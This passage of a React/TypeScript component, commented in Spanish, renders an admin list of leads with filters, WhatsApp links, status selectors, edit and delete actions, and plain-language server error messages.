            style={{ flex: '0 1 260px' }}
            value={busca}
            onChange={(e) => setBusca(e.target.value)}
          />
          {(['Todos', ...ESTADOS] as const).map((f) => (
            <button
              key={f}
              type="button"
              onClick={() => setFiltro(f)}
              aria-pressed={filtro === f}
              className={`${css.chip} ${filtro === f ? css.chipActivo : ''}`}
            >
              {f}
            </button>
          ))}
        </div>
        <div className={css.acciones}>
          {/* Arriba y no al final de la lista: con los filtros puestos la
              lista puede ser larguísima, y apuntar a alguien suele pasar con
              el móvil en la oreja. */}
          <button
            type="button"
            className={css.btn}
            onClick={() => {
              setAviso(null);
              setModo({ que: 'nuevo' });
            }}
          >
            Añadir contacto
          </button>
          <button type="button" className={css.btnLinea} onClick={exportar} disabled={!visibles.length}>
            Descargar en Excel
          </button>
        </div>
      </div>

      <section className={css.tarjeta}>
        {visibles.length === 0 ? (
          <p className={css.vacioTexto}>
            {/* Tres cosas distintas, y antes eran dos: si la carga ha fallado
                no se sabe si hay alguien o no, así que no se afirma. */}
            {fallo
              ? 'No he podido leer los contactos, así que no puedo decirte quién hay. Pulsa «Reintentar» aquí arriba.'
              : lista.length === 0
                ? 'Todavía no hay nadie. En cuanto alguien deje su contacto en la web aparecerá aquí, y mientras tanto puedes apuntar tú a quien conozcas con «Añadir contacto».'
                : 'Ningún contacto con ese filtro.'}
          </p>
        ) : (
          visibles.map((c) => (
            <article key={c.id} className={css.fila} style={{ padding: '16px 0', gap: 14 }}>
              <span
                style={{ flex: '1 1 220px', minWidth: 0, display: 'flex', flexDirection: 'column', gap: 5 }}
              >
                {/* El nombre abre la ficha. Es donde va a pulsar cualquiera
                    que quiera saber más de esa persona, así que mejor que sea
                    eso a poner un botón «ver» al final de la fila. */}
                <button
                  type="button"
                  onClick={() => setAbierta(c.id)}
                  className={css.abrirFicha}
                >
                  {c.nombre}
                  {c.ciudad && ` · ${c.ciudad}`}
                </button>
                <span style={{ fontSize: 12.5, fontWeight: 300, color: 'var(--muted)' }}>
                  {/* Se juntan solo los que existen. Antes se ponía el correo y
                      luego « · » más el móvil, así que a quien se apuntó en una
                      feria y solo dejó el teléfono —que es justo para lo que se
                      hizo esto— la línea le empezaba por el separador. */}
                  {[c.correo, c.whatsapp].filter(Boolean).join(' · ') || 'Sin correo ni móvil'}
                </span>
                {c.nota && (
                  <span style={{ fontSize: 12.5, fontWeight: 300, color: 'var(--ink-3)' }}>
                    «{c.nota}»
                  </span>
                )}
              </span>

              <span style={{ flex: '0 1 200px', display: 'flex', flexDirection: 'column', gap: 5 }}>
                {/* Qué busca, en la propia fila. Los botones de arriba filtran,
                    pero con «Todos» puesto —que es como se mira casi siempre—
                    hacía falta poder distinguirlos de un vistazo. */}
                <span className={css.tipoPersona} data-tipo={c.tipo}>
                  {ETIQUETA_TIPO[c.tipo]}
                </span>
                {c.perfil && (
                  <span style={{ fontSize: 13, fontWeight: 300, color: 'var(--ink-3)' }}>
                    {c.perfil}
                  </span>
                )}
                <span style={{ fontSize: 11.5, fontWeight: 300, color: 'var(--faint)' }}>
                  {/* A los apuntados a mano no se les pregunta de dónde vienen:
                      no vienen de ningún sitio, los escribió ella. A los demás
                      se les traduce el origen, porque «cita-madrid» en crudo no
                      se le enseña a nadie. */}
                  {apuntadoAMano(c) ? (
                    <span className={css.marcaMano}>Lo apuntaste tú, no vino de la web</span>
                  ) : (
                    comoLlego(c.origen)
                  )}
                  {' · '}
                  {cuando(c.creado)}
                  {c.veces > 1 && ` · ${c.veces} veces`}
                </span>
              </span>

              {/* `?? ''` porque el estado viene de Firestore sin comprobar: si
                  una ficha vieja guarda uno que ya no existe, CLASE[…] sale
                  undefined y esa palabra acababa dentro del className. */}
              <span className={`${css.estado} ${CLASE[c.estado] ?? ''}`}>{c.estado}</span>

              <span className={css.acciones}>
                {c.whatsapp && (
                  <a
                    className={`${css.btn} ${css.btnSm}`}
                    href={`https://wa.me/${c.whatsapp.replace(/\D/g, '')}`}
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    WhatsApp
                  </a>
                )}
                <select
                  aria-label={`Estado de ${c.nombre}`}
                  className={css.campoRedondo}
                  style={{ fontSize: 13 }}
                  value={c.estado}
                  onChange={(e) => cambiarEstado(c.id, e.target.value as Estado)}
                >
                  {/* Si la ficha guarda un estado que ya no está en la lista, se
                      añade al final en vez de dejar el desplegable enseñando
                      otro: enseñando otro, el primer clic lo cambiaría sin que
                      nadie hubiera querido cambiar nada. */}
                  {((ESTADOS as readonly string[]).includes(c.estado)
                    ? ESTADOS
                    : [...ESTADOS, c.estado]
                  ).map((e) => (
                    <option key={e}>{e}</option>
                  ))}
                </select>
                <button
                  type="button"
                  className={css.enlaceAccion}
                  /* Con el nombre dentro: en una lista larga, treinta botones
                     que solo dicen «Editar» no le sirven a quien navega
                     escuchando la pantalla. */
                  aria-label={`Editar la ficha de ${c.nombre || 'este contacto'}`}
                  onClick={() => {
                    setAviso(null);
                    setModo({ que: 'editar', contacto: c });
                  }}
                >
                  Editar
                </button>
                <button
                  type="button"
                  className={css.enlaceAccion}
                  aria-label={`Borrar a ${c.nombre || 'este contacto'}`}
                  onClick={() => borrar(c)}
                >
                  Borrar
                </button>
              </span>
            </article>
          ))
        )}
      </section>

      {/* La ficha se busca en la lista por su id en cada repintado: así, al
          cambiarle el estado o apuntarle algo, se ve al momento y no se queda
          con la copia de cuando se abrió. */}
      <FichaPersona
        persona={(lista ?? []).find((c) => c.id === abierta) ?? null}
        onCerrar={() => setAbierta(null)}
        onCambiarEstado={(id, estado) => cambiarEstado(id, estado as Estado)}
        onApuntar={apuntar}
      />

      {/* La `key` hace que al pasar de apuntar a corregir —o de una persona a
          otra— el panel se monte de nuevo con su borrador recién puesto, en vez
          de quedarse con lo que hubiera escrito antes. */}
      {modo && (
        <PanelContacto
          key={modo.que === 'editar' ? `editar-${modo.contacto.id}` : 'nuevo'}
          modo={modo}
          onCerrar={() => setModo(null)}
          onGuardar={guardar}
          /**
           * Abrir la ficha de quien ya estaba apuntada.
           *
           * Devuelve si se ha podido. La ficha se busca dentro de la lista
           * cargada, y esa lista viene recortada por el tope del servidor: si
           * la persona está en la base de datos pero no en el trozo que ha
           * llegado, cerrar el panel dejaba la pantalla sin panel y sin ficha,
           * como si el botón no hiciera nada. Ahora, si no está, el panel se
           * queda abierto y lo dice.
           */
          onVerFicha={(id) => {
            if (!lista?.some((c) => c.id === id)) return false;
            setModo(null);
            setAbierta(id);
            return true;
          }}
        />
      )}
    </div>
  );
}

/** Lo que contesta el servidor cuando el fallo no es de ningún campo. */
function motivoEnPalabras(motivo: unknown): string {
  if (motivo === 'sin-configurar') return 'Falta la configuración de Firebase en el servidor.';
  if (motivo === 'sin-permiso') return 'Esto solo lo puede hacer Sorela.';
  if (motivo === 'sin-sesion') return 'Se ha cerrado la sesión. Vuelve a entrar.';
  if (motivo === 'sin-cambios') return 'No has cambiado nada.';
  if (motivo === 'no-existe') return 'Esa ficha ya no está: la han borrado mientras la corregías.';
  return 'No he podido guardarlo. Vuelve a intentarlo.';
}
